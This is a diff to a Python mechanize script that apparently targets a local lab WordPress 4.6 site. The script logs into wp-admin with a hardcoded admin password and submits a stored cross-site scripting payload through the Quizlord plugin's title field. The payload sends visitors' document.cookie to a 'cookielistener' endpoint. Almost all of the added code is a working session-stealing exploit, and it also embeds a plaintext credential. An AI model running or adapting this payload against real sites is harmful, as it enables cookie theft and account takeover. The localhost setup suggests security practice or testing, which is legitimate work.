@@ -12,27 +12,42 @@ browser = mechanize.Browser()
 browser.set_handle_robots(False)
 
 #Opening my URI to the DVWA web page obviously your location will most likely vary
-#browser.open("http://http://localhost:8888/")
-browser.open("http://www.ansa.it")
+browser.open("http://localhost:8888/WordPress-4.6/wp-admin/")
 
 #Printing to browser title to show where I am
-#print ("#" *55)
-print ("# " + browser.title())
-#print ("#" *55 + "\n")
-#
+
+print "\n" + ("# " + browser.title() + "\n")
+
 ##There is only one form on this page so I jump right in
-#browser.select_form(nr=0)
-#
-#
+browser.select_form("loginform")
+
 ##Below I am filling out the form fields and submitting for log in
-#browser.form['username'] = 'admin'
-#browser.form['password'] = 'password'
-#browser.submit()
-#
-##Again printing the browser title to show where I am
-#print ("#" *55)
-#print ("# " + browser.title())
-#print ("#" *55)
+browser.form['log'] = 'admin'
+browser.form['pwd'] = 'hgxSk#Fmexnu0^v!#B'
+browser.submit()
+
+#Again printing the browser title to show where I am
+
+print ("# " + browser.title() + "\n")
+
+browser.open("http://localhost:8888/WordPress-4.6/wp-admin/admin.php?page=quizlord")
+
+print ("# " + browser.title() + "\n")
+
+
+browser.form = list(browser.forms())[1]
+#print (browser.form)
+
+browser.form['title'] = '"><script language= "JavaScript">document.location="http://localhost:8888/cookielistener.php?cookie=" + document.cookie;document.location="http://localhost:8888/WordPress-4.6/wp-admin/admin.php?page=quizlord"</script>'
+#for control in browser.form.controls:
+#    print control
+
+browser.submit()
+
+browser.open("http://localhost:8888/WordPress-4.6/wp-admin/admin.php?page=quizlord")
+
+print ("# " + browser.title() + "\n")
+
 ##print (browser.response().read())
 #
 #
